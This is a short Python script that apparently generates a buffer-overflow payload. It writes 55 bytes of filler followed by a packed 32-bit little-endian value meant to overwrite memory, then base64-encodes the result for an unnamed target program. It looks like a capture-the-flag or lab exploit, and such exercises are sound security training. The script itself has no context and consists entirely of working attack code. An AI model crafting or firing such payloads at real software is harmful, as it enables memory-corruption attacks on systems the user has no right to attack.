
import sys
import struct
import base64

buf = b'VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV'
buf += struct.pack('<I', 4013235591)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
